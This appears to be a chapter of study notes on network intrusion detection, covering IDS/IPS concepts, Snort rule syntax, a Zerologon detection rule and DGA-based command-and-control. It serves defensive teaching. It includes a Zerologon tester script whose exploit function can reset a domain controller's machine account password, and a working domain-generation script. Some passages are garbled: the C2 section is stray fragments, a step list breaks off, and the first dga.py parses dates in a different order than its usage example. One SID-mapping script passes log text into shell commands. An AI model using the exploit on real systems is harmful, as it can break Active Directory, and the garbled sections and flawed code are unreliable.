# 11. Network Detections

## Overview

This chapter focuses on detecting malicious activity at the **network level**.

The main topics are:

```text
1. Intrusion Detection Systems
2. Snort rule syntax
3. Detecting known vulnerabilities
4. Detecting novel attacks
5. Detecting Command and Control traffic
6. Scripts used in the chapter
```

Main idea:

```text
Network traffic can reveal attacks even when the endpoint logs are incomplete,
the endpoint is already compromised, or the exploit attempt fails.
```

A defender can use network data such as IDS alerts, PCAP files, DNS logs, proxy logs, firewall logs, and endpoint logs together to understand what happened.

# 11.1 Intrusion Detection Systems

## What Is an IDS?

IDS means:

```text
Intrusion Detection System
```

An IDS monitors network traffic and generates alerts when suspicious or malicious activity is detected.

Simple meaning:

```text
IDS = watches network traffic and alerts defenders
```

Example flow:

```text
Suspicious packet detected
→ IDS compares packet with rules/signatures
→ Rule matches
→ Alert is generated
→ Analyst investigates
```

---

## What Is an IPS?

IPS means:

```text
Intrusion Prevention System
```

An IPS is similar to an IDS, but it can also block malicious traffic.

Simple difference:

```text
IDS = detects and alerts
IPS = detects and blocks
```

Example:

```text
IDS:
SQL injection detected → alert only

IPS:
SQL injection detected → alert + block connection
```

---

## IDS vs IPS

| Technology | Main Function | Action |
|---|---|---|
| IDS | Detection | Alert |
| IPS | Prevention | Alert and block |

Simple summary:

```text
IDS is passive detection.
IPS is active prevention.
```

---

# Network Visibility Sources

Network detection depends on what type of traffic data we collect.

Two important sources are:

```text
1. NetFlow
2. Full Packet Capture
```

---

## NetFlow

NetFlow stores metadata about network communication.

It does **not** store full packet payload.

Example NetFlow fields:

```text
Source IP
Destination IP
Source port
Destination port
Protocol
Bytes transferred
Connection start time
Connection end time
```

Simple meaning:

```text
NetFlow tells us who talked to whom, when, and how much.
```

Example:

```text
192.168.51.50 → 172.16.51.10
TCP/80
500 MB transferred
```

NetFlow can help detect:

```text
Large data transfers
Data exfiltration
Unusual external connections
Connections to known malicious IPs
Unexpected ports
Beaconing behavior
```

Limitation:

```text
NetFlow does not show packet content.
```

So NetFlow usually cannot show:

```text
Exact HTTP request
Malicious SQL query
Exploit bytes
C2 payload
User-Agent string
```

---

## Full Packet Capture

Full Packet Capture stores the complete packet data.

Simple meaning:

```text
Full packet capture stores the actual packet contents.
```

It can show:

```text
HTTP requests
Payload content
Exploit patterns
Protocol details
User-Agent strings
DNS queries
C2 traffic structure
```

Advantage:

```text
Much deeper investigation is possible.
```

Disadvantage:

```text
Requires much more storage and processing power.
```

Comparison:

| Type | Stores Payload? | Good For | Limitation |
|---|---|---|---|
| NetFlow | No | High-level traffic overview | No packet content |
| Full Packet Capture | Yes | Deep forensic analysis | Expensive storage/processing |

# IDS Placement

IDS sensors can be deployed in different ways.

The two main deployment models are:

```text
1. Passive IDS
2. Inline IDS / IPS
```

---

## Passive IDS

A passive IDS receives a copy of the traffic.

It does not sit directly in the traffic path.

Simple meaning:

```text
Traffic is copied to IDS.
IDS inspects it.
IDS alerts if needed.
```

Common methods:

```text
SPAN port
Network tap
Packet broker
Cloud traffic mirror
```

Advantage:

```text
Low risk because it cannot break traffic flow.
```

Disadvantage:

```text
It cannot directly block traffic.
```

---

## Inline IDS / IPS

An inline sensor sits directly in the traffic path.

Simple meaning:

```text
Traffic passes through the sensor.
The sensor can allow or block traffic.
```

If blocking is enabled, it becomes IPS-like.

Advantage:

```text
Can stop attacks in real time.
```

Disadvantage:

```text
If misconfigured, it can disrupt production traffic.
```

---

## Cloud IDS Consideration

In cloud environments, IDS deployment can be more difficult because:

```text
Network topology is controlled by the cloud provider.
Full packet capture can be expensive.
Traffic visibility may be limited.
```

A practical approach is to inspect high-value traffic only.

Examples:

```text
Outbound web traffic
Traffic to sensitive servers
Ingress traffic to public-facing applications
Traffic between critical subnets
```

# Snort

## What Is Snort?

Snort is a popular IDS/IPS engine.

It inspects network traffic and compares it against rules.

Simple meaning:

```text
Snort = packet inspection engine + detection rules
```

Snort can detect:

```text
Port scans
Exploit attempts
Malware traffic
C2 traffic
SQL injection
Suspicious protocols
Known vulnerability patterns
```

---

# Snort Rule Structure

A Snort rule has two main parts:

```text
1. Rule header
2. Rule options
```

Basic structure:

```text
action protocol source_ip source_port direction destination_ip destination_port ( options; )
```

Example:

```snort
alert icmp $HOME_NET any <> $EXTERNAL_NET any (msg:"ICMP Traffic Detected"; sid:10000001;)
```

---

## Rule Header

The rule header defines the traffic to inspect.

Example:

```snort
alert icmp $HOME_NET any <> $EXTERNAL_NET any
```

Breakdown:

| Part | Meaning |
|---|---|
| `alert` | Generate an alert |
| `icmp` | Inspect ICMP traffic |
| `$HOME_NET` | Local/internal network |
| `any` | Any source port |
| `<>` | Bidirectional traffic |
| `$EXTERNAL_NET` | External network |
| `any` | Any destination port |

---

## Rule Options

Rule options are inside parentheses:

```snort
(msg:"ICMP Traffic Detected"; sid:10000001; metadata:policy security-ips alert;)
```

Common options:

| Option | Meaning |
|---|---|
| `msg` | Alert message |
| `sid` | Snort rule ID |
| `rev` | Rule revision |
| `classtype` | Alert classification |
| `priority` | Alert priority |
| `content` | Pattern to match |
| `flow` | TCP session direction/state |
| `metadata` | Additional rule metadata |
| `reference` | CVE or URL reference |

---

## Snort Direction Operators

| Operator | Meaning |
|---|---|
| `->` | One-way traffic |
| `<>` | Bidirectional traffic |

Example one-way:

```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET 53 (msg:"TCP DNS traffic"; sid:10000002;)
```

Meaning:

```text
Only inspect traffic from HOME_NET to EXTERNAL_NET port 53.
```

Example bidirectional:

```snort
alert icmp $HOME_NET any <> $EXTERNAL_NET any (msg:"ICMP Traffic Detected"; sid:10000001;)
```

Meaning:

```text
Inspect traffic in both directions.
```

# Zerologon Detection

## What Is Zerologon?

Zerologon is:

```text
CVE-2020-1472
```

It affects the Microsoft Netlogon Remote Protocol.

The vulnerability can allow an unauthenticated attacker to compromise a vulnerable domain controller.

Important:

```text
Zerologon is extremely dangerous.
Never test it on production systems.
Some exploit scripts can reset a Domain Controller machine account password.
That can break Active Directory.
```

The lab attack is used to generate detectable network traffic.

Even if the domain controller is patched and the exploit fails, the attempt can still be detected by Snort.

---

## Zerologon Detection Concept

The exploit abuses Netlogon cryptographic behavior.

The detection focuses on suspicious Netlogon RPC traffic.

Important protocol elements:

```text
DCE/RPC
Netlogon Remote Protocol
NetrServerReqChallenge
Operation number 4
```

---

## Zerologon Snort Rule

Example rule:

```snort
alert tcp any any -> $HOME_NET any (
    msg:"OS-WINDOWS Microsoft Windows Netlogon crafted NetrServerReqChallenge elevation of privilege attempt";
    flow:to_server,established;
    dce_iface:uuid 12345678-1234-abcd-ef00-01234567cffb;
    dce_opnum:"4";
    content:"|04 00|",depth 2,offset 22,fast_pattern;
    content:"|00 00 00|",distance 0;
    isdataat:7,relative;
    isdataat:!8,relative;
    byte_extract:1,0,first_cc_byte,relative;
    byte_test:1,=,first_cc_byte,0,relative;
    byte_test:1,=,first_cc_byte,1,relative;
    byte_test:1,=,first_cc_byte,2,relative;
    byte_test:1,=,first_cc_byte,3,relative;
    detection_filter:track by_src, count 10, seconds 10;
    metadata:policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop;
    service:dcerpc;
    reference:cve,2020-1472;
    classtype:attempted-admin;
    sid:55703;
    rev:4;
)
```

---

## Zerologon Rule Header

```snort
alert tcp any any -> $HOME_NET any
```

Meaning:

```text
Alert on TCP traffic from anywhere to internal systems.
```

This is broad, but the rule options make the detection specific.

---

## `flow:to_server,established`

```snort
flow:to_server,established;
```

Meaning:

```text
Only inspect packets going to the server
and only when the TCP session is already established.
```

This reduces false positives and improves performance.

---

## `dce_iface`

```snort
dce_iface:uuid 12345678-1234-abcd-ef00-01234567cffb;
```

Meaning:

```text
Inspect DCE/RPC traffic for the Netlogon Remote Protocol interface.
```

The UUID identifies the RPC interface.

---

## `dce_opnum`

```snort
dce_opnum:"4";
```

Meaning:

```text
Match RPC operation number 4.
```

For this rule:

```text
opnum 4 = NetrServerReqChallenge
```

This is the Netlogon function used by the exploit attempt.

---

## `content`

Snort `content` rules search for specific byte patterns.

Example:

```snort
content:"|04 00|",depth 2,offset 22,fast_pattern;
```

Meaning:

```text
Look for hex bytes 04 00
starting at offset 22
and inspect only 2 bytes.
```

The `fast_pattern` keyword tells Snort:

```text
Use this content match as an optimized fast match.
```

---

## `isdataat`

Example:

```snort
isdataat:7,relative;
isdataat:!8,relative;
```

Meaning:

```text
Check whether data exists at a specific relative location.
```

In this rule, it helps validate the exact data structure expected in the exploit traffic.

---

## `byte_extract`

```snort
byte_extract:1,0,first_cc_byte,relative;
```

Meaning:

```text
Extract 1 byte from offset 0
and save it into the variable first_cc_byte.
```

Simple meaning:

```text
byte_extract saves a byte into a variable.
```

---

## `byte_test`

Example:

```snort
byte_test:1,=,first_cc_byte,0,relative;
byte_test:1,=,first_cc_byte,1,relative;
byte_test:1,=,first_cc_byte,2,relative;
byte_test:1,=,first_cc_byte,3,relative;
```

Meaning:

```text
Compare the following bytes with the previously extracted byte.
```

This checks for a repeated byte pattern.

In the Zerologon analysis, these four bytes relate to the:

```text
Offset header field
```

of the Network Logon protocol header.

---

## `detection_filter`

```snort
detection_filter:track by_src, count 10, seconds 10;
```

Meaning:

```text
Trigger only if 10 matching packets are seen from the same source within 10 seconds.
```

This reduces noise.

Simple meaning:

```text
Do not alert on one packet.
Alert only when the suspicious pattern repeats quickly.
```

# Zerologon Tester Script Concept

The following Python script (Zerologon) testing script.

Its purpose is:

```text
Send repeated Netlogon authentication attempts
and test whether the target is vulnerable.
```

Important warning:

```text
The original Zerologon exploit code can change the Domain Controller machine account password.
That action can break Active Directory.
Because of that, the dangerous password-reset exploit body should only exist in an isolated lab.
```

Safe understanding of the script:

```text
1. Receive DC name and DC IP as arguments
2. Connect to the Netlogon RPC service
3. Try repeated authentication attempts
4. If the target is vulnerable, the exploit may succeed
5. If the target is patched, the attack fails
6. Network traffic is still generated and can be detected by Snort
```

Example lab command:

```bash
python3 zerologon_tester.py server02 172.16.51.10
```

Example safe lab result:

```text
Performing authentication attempts...
=====
Attack failed. Target is probably patched.
```

Important point:

```text
Even when the attack fails because the target is patched,
Snort can still detect the attempt.
```

---

## Script: `zerologon_tester.py` 


```python
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.


    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )


        # It worked!
        assert server_auth['ErrorCode'] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)

def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    for attempt in range(0, 10):
        result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)

        if result is None:
            print('=', end='', flush=True)
        else:
            break
```

Defender focus:

```text
Even failed attempts can generate Netlogon RPC traffic.
Snort can detect the suspicious Netlogon pattern.
```

# Mapping Alert SIDs to Snort Rules

## Purpose

The alert log shows only the SID and message.

To understand the exact rule logic, map the SID back to the rule file.

Rule file:

```text
/usr/local/etc/rules/sql.rules
```

---

## Script: `extract_sql_rules.py`

```python
#!/usr/bin/env python

import sys
import re
import os

snort_sql_rule_file_path = "/usr/local/etc/rules/sql.rules"

rules = os.popen("cat /var/log/snort/alert_fast.txt | cut -d ':' -f 4 | sort | uniq").read()
rules = rules.split('\n')

for rule in rules[:-1]:
    cmd = 'cat {} | grep {}'.format(snort_sql_rule_file_path, rule)
    ret = os.popen(cmd).read()
    print(ret)
```

---

1. Reads /var/log/snort/alert_fast.txt

# Improved Version of `extract_sql_rules.py`

The original script works, but this version is easier to read and safer because it avoids shell command parsing.

```python
#!/usr/bin/env python3

"""
extract_sql_rules.py

Purpose:
    Extract unique Snort SIDs from alert_fast.txt and print matching
    rules from sql.rules.
"""

from pathlib import Path

ALERT_FILE = Path("/var/log/snort/alert_fast.txt")
SQL_RULE_FILE = Path("/usr/local/etc/rules/sql.rules")


def extract_sids(alert_file):
    sids = set()

    if not alert_file.is_file():
        print(f"Alert file not found: {alert_file}")
        return sids

    with alert_file.open("r", errors="ignore") as f:
        for line in f:
            # Snort alert format often contains something like:
            # [1:1061:13]
            if "[" in line and ":" in line:
                parts = line.split(":")
                if len(parts) >= 4:
                    sid = parts[3].strip()
                    if sid.isdigit():
                        sids.add(sid)

    return sorted(sids)


def print_matching_rules(rule_file, sids):
    if not rule_file.is_file():
        print(f"Rule file not found: {rule_file}")
        return

    rules = rule_file.read_text(errors="ignore").splitlines()

    for sid in sids:
        print(f"\n# Matching rule for SID {sid}")
        found = False

        for rule in rules:
            if f"sid:{sid};" in rule:
                print(rule)
                found = True

        if not found:
            print("No matching rule found.")


def main():
    sids = extract_sids(ALERT_FILE)

    print("Unique SIDs found:")
    for sid in sids:
        print(f"  {sid}")

    print_matching_rules(SQL_RULE_FILE, sids)


if __name__ == "__main__":
    main()
```

Attacker-controlled server

C2 lets attackers remotely control infected systems.

Typical C2 architecture:

Operator

The compromised endpoint usually runs an agent.

Simple flow:

Smaller initial payload

Flexible payload loading

# Domain Generation Algorithm

## What Is a DGA?

DGA means:

```text
Domain Generation Algorithm
```

A DGA creates domains dynamically.

Simple meaning:

```text
Malware generates many possible C2 domains instead of hardcoding one domain.
```

Example:

```text
bkjaewxytklxmnpb.com
```

Why attackers use DGA:

```text
Avoid hardcoded C2 domains
Make blocking harder
Rotate infrastructure
Recover if some domains are blocked
```

---

## Script: `dga.py`

```python
import sys

def usage():
    print("Usage: " + sys.argv[0] + " [date]")
    print("Usage: " + sys.argv[0] + " 12.02.2021")
    sys.exit()

def generate_domain(year: int, month: int, day: int) -> str:
    domain = ""

    for i in range(0x10):
        year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
        month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)
        domain += chr(((year ^ month ^ day) % 25) + 97)

    print(domain + ".com")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        date = sys.argv[1]
        y, m, d = date.split('.')
        generate_domain(int(y), int(m), int(d))
    else:
        usage()
```

---

## How `dga.py` Works

Input:

```bash
python3 dga.py 11.02.2021
```

Output:

```text
bkjaewxytklxmnpb.com
```

Logic:

```text
1. Take date as input
2. Split date into year/month/day values
3. Run bitwise operations
4. Generate 16 pseudo-random characters
5. Add ".com"
```

Important:

```text
The same input date creates the same domain.
```

This allows both malware and attacker infrastructure to know which domain should be active on a given day.

---

## Improved Version of `dga.py`

This version is easier to read and validates input format.

```python
#!/usr/bin/env python3

"""
dga.py

Purpose:
    Generate a pseudo-random domain based on a date.
    This demonstrates how malware can use a DGA to calculate
    C2 domains dynamically.
"""

import sys


def usage():
    print(f"Usage: {sys.argv[0]} <dd.mm.yyyy>")
    print(f"Example: {sys.argv[0]} 11.02.2021")
    sys.exit(1)


def generate_domain(day: int, month: int, year: int) -> str:
    domain = ""

    for _ in range(0x10):
        year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
        month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)

        # Generate a lowercase ASCII character
        domain += chr(((year ^ month ^ day) % 25) + 97)

    return domain + ".com"


def main():
    if len(sys.argv) != 2:
        usage()

    try:
        day, month, year = map(int, sys.argv[1].split("."))
    except ValueError:
        usage()

    print(generate_domain(day, month, year))


if __name__ == "__main__":
    main()
```
